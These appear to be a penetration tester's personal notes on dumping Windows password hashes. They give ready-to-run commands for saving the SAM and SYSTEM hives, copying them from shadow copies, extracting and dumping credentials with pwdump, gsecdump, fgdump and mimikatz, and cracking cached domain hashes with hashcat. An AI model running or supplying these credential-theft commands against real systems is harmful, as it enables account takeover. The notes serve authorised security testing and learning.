## Password Hashes

### Security Account Manager (SAM) Files

I'm not sure how well this works across the various Windows platforms, but this worked on Windows XP at least

#### Dump from Registry (All Windows)

Most compatible across Windows Versions, but dumps entire registry branch, so you have to filter through it.

```powershell
# Save SAM
reg.exe save HKLM\SAM samoutfile
reg.exe save HKLM\SYSTEM sysoutfile
```

#### Dump from Shadow Copies (modern method)

Works in modern Windows systems

```powershell
# List existing shadow copies
cscript vssown.vbs /list

# Check Volume Shadow Service (VSS) status
cscript vssown.vbs /status
cscript vssown.vbs /mode

# Create a new shadow copy
cscript vssown.vbs /create
# Verify it was created
cscript vssown.vbs /list
# For cleanup, note the Device object value and ID

# Copy the SAM and SYSTEM files from the shadow copy.  Note:  Reference the files by prepending the SAM/SYSTEM path with the Device Object Path, as shown below:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp

# For cleanup, delete the newly created copy
cscript vssown.vbs /delete {YOURCOPYID}

# If the service was stopped originally, stop with this:
cscript vssown.vbs /stop
```

#### Extract Hashes from SAM/SYSTEM Files

You can use pwdump.py to extract the hashes:

```bash
sudo pip install pycryptodome
git clone https://github.com/Neohapsis/creddump7.git
python pwdump.py SYSTEMFILE SAMFILE
```

### Dumping Hashes from Memory

Most (if not all) of these need to be run as SYSTEM to work

### gsecdump

This tool (allegedly) works on 32bit and 64bit Windows across all versions of Windows (it had issues when I tried it on Win2019x64).   This tool injects a DLL into the LSASS process to grab hashes from memory.  This is dangerous to do in a production environment and can cause a kernel panic (BSoD).   Registry and Shadow Copies are safer for production environments.  I had success running this on Windows XP in a non-interactive shell:

```powershell
# Dump all secrets
gsecdump -a

# Dump hashes from SAM/AD
# This should give you the LM hash, it did on WinXP
# Note:  The LM hash was the second hash field in the output
geecdump -s
```

I found this at  https://download.openwall.net/pub/projects/john/contrib/win32/pwdump/

### fgdump

This is another option to dump hashes.  It will dump the creds to a file in the same directory in a file called `YOURIP.pwdump`

It is located in /usr/share/windows-binaries/fgdump and is also available at  https://download.openwall.net/pub/projects/john/contrib/win32/pwdump/

```powershell
# Outputs a file with the results
fgdump
```

### Duds

DumpSvc - Win2019 - this one just ran and did nothing, even from an interactive command prompt.

LSADump2 - I've tried this on WinXP and Win2019 and both times it crashed my reverse shell session.

LSASecretsDump - Win2019 - This printed a little info screen and did nothing at an interactive prompt



### PWDump7

Apparently there's many versions of this.  I've not used it either, but it can be downloaded from http://www.tarasco.org/security/pwdump_7/

### PWDumpX

It appears this is intended to connect through SMB, but it requires admin privileges to do.

I think I tried this on Windows XP Non-Int shell and it didn't work, but it can be downloaded here:  https://packetstormsecurity.com/files/62371/PWDumpX14.zip



### Windows Credential Editor (WCE)

I tried using this one on Windows XP in a non-interactive shell and it wouldn't work.   I wonder if the older version would've worked.  It can be downloaded here:  https://www.ampliasecurity.com/research/windows-credentials-editor/

#### Mimikatz (Meterpreter or Local Interactive)

Mimikatz leverages Local Security Authority Subsystem (LSASS) to access these hashes and requires Admin privileges.  Mimikatz is available as a stand-alone program and is also available as a module for meterpreter.

- First executes `privilege::debug` which enables SeDebugPrivilge access right to tamper with another process.  If this fails, then mimikatz didn't have admin rights.
- LSASS is a SYSTEM process, so it's rights are even higher than admin rights, so `token::elevate` is used to elevate the security token from 'high integrity' (admin) to 'SYSTEM integrity'.  If mimikatz is launched from a SYSTEM shell, this is not required.

```powershell
# Start the mimikatz interpreter in an ADMIN prompt
mimikatz.exe
# enable SeDebugPrivilge
privilege::debug
# Elevate security token
token::elevate
# Dump SAM database
lsadump::sam
# Dump cached domain creds
lsadump::cache
```

To crack hashed domain creds, reformat the output first, it should be in the following format `$DCC2$10240#username#hash`

Then run it through hashcat

```bash
hashcat -m2100 hashes.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable

$DCC2$10240#tris#8f4de03080e5a01e8b883fa8346ac110
$DCC2$10240#pete#b566afa0a7e41755a286cba1a7a3012d
```



##### Non-Interactive Mode

I haven't tested this, but one site claims Mimikatz can be run in non-interactive mode with the following syntax.  I tried this on Windows XP in non-interactive mode and it didn't work, but that might have been specific to the box:

```powershell
C:\temp\mimikatz64.exe "sekurlsa::logonPasswords full" exit >> C:\temp\mimi.txt
```

### Passing the Hash

See the documentation `Linux\Pentest Cmds\Password Attacks\Hashes.md` documentation for this.

### Links

Detailed Write-up on Hash dump strategies - https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html

Quick Summary of PrivEsc in Windows - http://pentestmonkey.net/uncategorized/from-local-admin-to-domain-admin

Old Tool Downloads - https://download.openwall.net/pub/projects/john/contrib/win32/pwdump/

Another old guide to check out for options - https://flylib.com/books/en/3.85.1.52/1/

Windows Hacking Pack - https://github.com/51x/WHP